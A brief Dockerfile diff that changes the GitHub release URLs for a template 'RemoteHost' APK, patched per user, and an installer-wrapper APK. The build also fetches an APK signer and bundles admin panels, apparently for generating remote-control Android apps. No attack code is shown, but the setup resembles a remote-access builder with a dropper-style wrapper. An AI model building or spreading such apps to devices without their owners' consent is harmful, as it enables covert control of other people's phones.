@@ -23,9 +23,9 @@ RUN curl -fL -o /app/uber-apk-signer.jar \
 #  - template.apk           = inner RemoteHost app (patched per-user)
 #  - template-installer.apk = installer wrapper (holds the patched inner app)
 RUN curl -fL -o /app/template.apk \
-        https://github.com/walterhizenburg1-ops/remote-control-server/releases/download/v1-template/template.apk && \
+        https://github.com/starkZ-dev/admin-control-server/releases/download/v1-template/template.apk && \
     curl -fL -o /app/template-installer.apk \
-        https://github.com/walterhizenburg1-ops/remote-control-server/releases/download/v1-installer/template-installer.apk
+        https://github.com/starkZ-dev/admin-control-server/releases/download/v1-installer/template-installer.apk
 
 # Copy app code + admin panels
 COPY server.js ./
